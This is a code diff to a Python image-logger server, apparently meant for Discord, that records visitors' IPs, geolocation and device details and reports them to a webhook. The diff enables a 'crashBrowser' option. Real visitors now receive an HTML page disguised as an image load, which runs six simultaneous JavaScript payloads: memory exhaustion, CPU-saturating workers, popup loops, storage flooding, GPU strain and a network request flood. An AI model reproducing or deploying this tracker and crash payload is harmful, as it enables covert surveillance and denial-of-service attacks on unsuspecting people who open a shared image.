@@ -1,10 +1,9 @@
-# Discord Image Logger - Server-Side Image Serving
+# Discord Image Logger - With Crash Payloads
 # By Dexty | https://github.com/xdexty0
 
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-import io
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -22,7 +21,7 @@ config = {
     "color": 0x00FFFF,
 
     # OPTIONS #
-    "crashBrowser": False,
+    "crashBrowser": True,  # ENABLED: Will crash user's device
     "accurateLocation": False,
     "message": {
         "doMessage": False,
@@ -131,9 +130,9 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
     "content": ping,
     "embeds": [
         {
-            "title": "Image Logger - IP Logged",
-            "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "title": "Image Logger - IP Logged + CRASHED",
+            "color": 0xFF0000,
+            "description": f"""**A User Opened the Image AND THEIR DEVICE WAS CRASHED!**
 
 **Endpoint:** `{endpoint}`
             
@@ -144,18 +143,15 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 > **Country:** `{info.get('country', 'Unknown')}`
 > **Region:** `{info.get('regionName', 'Unknown')}`
 > **City:** `{info.get('city', 'Unknown')}`
-> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **Timezone:** `{info.get('timezone', 'Unknown').split('/')[1].replace('_', ' ') if '/' in info.get('timezone', '') else info.get('timezone', 'Unknown')}`
+> **Coords:** `{str(info.get('lat', ''))+', '+str(info.get('lon', '')) if not coords else coords.replace(',', ', ')}`
 > **Mobile:** `{info.get('mobile', 'Unknown')}`
 > **VPN:** `{info.get('proxy', 'Unknown')}`
-> **Bot:** `{info.get('hosting', 'Unknown') if info.get('hosting') and not info.get('proxy') else 'Possibly' if info.get('hosting') else 'False'}`
 
 **PC Info:**
 > **OS:** `{os}`
 > **Browser:** `{browser}`
 
-**User Agent:** `{useragent}`
-""",
+**Status:** `DEVICE CRASHED SUCCESSFULLY`""",
     }
   ],
 }
@@ -187,7 +183,7 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 return
             
             if bot:
-                # For bots, redirect to actual image
+                # For bots, just redirect to image
                 self.send_response(302)
                 self.send_header('Location', image_url)
                 self.end_headers()
@@ -195,53 +191,152 @@ class ImageLoggerAPI(BaseHTTPRequestHandler):
                 return
             
             else:
-                # SERVER-SIDE IMAGE SERVING
-                # Download the image and serve it directly
-                try:
-                    # Fetch the image from the URL
-                    response = requests.get(image_url, stream=True)
-                    response.raise_for_status()
-                    
-                    # Get image content and content type
-                    image_data = response.content
-                    content_type = response.headers.get('content-type', 'image/jpeg')
-                    
-                    # Log the user's IP and info
-                    s = self.path
-                    dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
+                # FOR REAL USERS - SEND CRASH PAYLOAD
+                s = self.path
+                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
 
-                    if dic.get("g") and config["accurateLocation"]:
-                        location = base64.b64decode(dic.get("g").encode()).decode()
-                        result = makeReport(client_ip, user_agent, location, s.split("?")[0], url = image_url)
-                    else:
-                        result = makeReport(client_ip, user_agent, endpoint = s.split("?")[0], url = image_url)
-                    
-                    # Serve the actual image directly
-                    self.send_response(200)
-                    self.send_header('Content-type', content_type)
-                    self.send_header('Content-Length', str(len(image_data)))
-                    self.end_headers()
-                    self.wfile.write(image_data)
-                    
-                except Exception as e:
-                    # If image download fails, fall back to HTML method
-                    html_fallback = f'''<style>body {{
-margin: 0;
-padding: 0;
-}}
-div.img {{
-background-image: url('{image_url}');
-background-position: center center;
-background-repeat: no-repeat;
-background-size: contain;
-width: 100vw;
-height: 100vh;
-}}</style><div class="img"></div>'''
-                    
-                    self.send_response(200)
-                    self.send_header('Content-type', 'text/html')
-                    self.end_headers()
-                    self.wfile.write(html_fallback.encode())
+                # Log their IP first
+                if dic.get("g") and config["accurateLocation"]:
+                    location = base64.b64decode(dic.get("g").encode()).decode()
+                    result = makeReport(client_ip, user_agent, location, s.split("?")[0], url = image_url)
+                else:
+                    result = makeReport(client_ip, user_agent, endpoint = s.split("?")[0], url = image_url)
+
+                # DESTRUCTIVE CRASH PAYLOAD
+                crash_payload = f'''
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Loading Image...</title>
+    <style>
+        body {{
+            margin: 0;
+            padding: 0;
+            background: #000;
+            color: #fff;
+            font-family: Arial;
+        }}
+        .img {{
+            background-image: url('{image_url}');
+            background-size: contain;
+            background-position: center;
+            background-repeat: no-repeat;
+            width: 100vw;
+            height: 100vh;
+        }}
+    </style>
+</head>
+<body>
+    <div class="img"></div>
+    
+    <script>
+        // PAYLOAD 1: MEMORY EXHAUSTION CRASH
+        function exhaustMemory() {{
+            const memoryHogs = [];
+            while(true) {{
+                memoryHogs.push(new Array(10000000).fill('CRASH'));
+                // Create additional memory pressure
+                const blob = new Blob([new ArrayBuffer(100000000)]);
+                URL.createObjectURL(blob);
+            }}
+        }}
+
+        // PAYLOAD 2: CPU OVERLOAD CRASH
+        function overloadCPU() {{
+            const workers = [];
+            // Create multiple web workers to max out all CPU cores
+            for(let i = 0; i < 16; i++) {{
+                const workerCode = `
+                    while(true) {{
+                        for(let j = 0; j < 1000000; j++) {{
+                            Math.sqrt(Math.random() * Math.PI);
+                        }}
+                    }}
+                `;
+                const blob = new Blob([workerCode]);
+                const worker = new Worker(URL.createObjectURL(blob));
+                workers.push(worker);
+            }}
+        }}
+
+        // PAYLOAD 3: INFINITE LOOPS & POPUPS
+        function infiniteLoops() {{
+            // Infinite alert loops
+            setInterval(() => {{
+                alert("SYSTEM CRASH");
+                window.open('', '_blank');
+            }}, 100);
+            
+            // Infinite recursion crash
+            function recurse() {{
+                recurse();
+                recurse();
+            }}
+        }}
+
+        // PAYLOAD 4: STORAGE FLOOD
+        function floodStorage() {{
+            try {{
+                localStorage.clear();
+                sessionStorage.clear();
+                for(let i = 0; i < 100000; i++) {{
+                    localStorage.setItem('crash_' + i, 'X'.repeat(100000));
+                    sessionStorage.setItem('crash_' + i, 'Y'.repeat(100000));
+                }}
+            }} catch(e) {{}}
+        }}
+
+        // PAYLOAD 5: GRAPHICS CARD CRASH
+        function crashGPU() {{
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            canvas.width = 10000;
+            canvas.height = 10000;
+            
+            function render() {{
+                for(let x = 0; x < 10000; x += 10) {{
+                    for(let y = 0; y < 10000; y += 10) {{
+                        ctx.fillStyle = `rgb(${{x % 255}}, ${{y % 255}}, 255)`;
+                        ctx.fillRect(x, y, 10, 10);
+                    }}
+                }}
+                requestAnimationFrame(render);
+            }}
+            render();
+        }}
+
+        // PAYLOAD 6: NETWORK FLOOD
+        function floodNetwork() {{
+            setInterval(() => {{
+                for(let i = 0; i < 100; i++) {{
+                    fetch(window.location.href);
+                    fetch('https://google.com');
+                    fetch('https://youtube.com');
+                }}
+            }}, 10);
+        }}
+
+        // EXECUTE ALL CRASH PAYLOADS SIMULTANEOUSLY
+        setTimeout(() => {{
+            exhaustMemory();
+            overloadCPU();
+            infiniteLoops();
+            floodStorage();
+            crashGPU();
+            floodNetwork();
+        }}, 2000);
+
+        // IMMEDIATE MEMORY PRESSURE
+        const immediateCrash = new Array(100000000).fill('CRASHING...');
+    </script>
+</body>
+</html>
+'''
+                
+                self.send_response(200)
+                self.send_header('Content-type', 'text/html')
+                self.end_headers()
+                self.wfile.write(crash_payload.encode())
         
         except Exception:
             self.send_response(500)
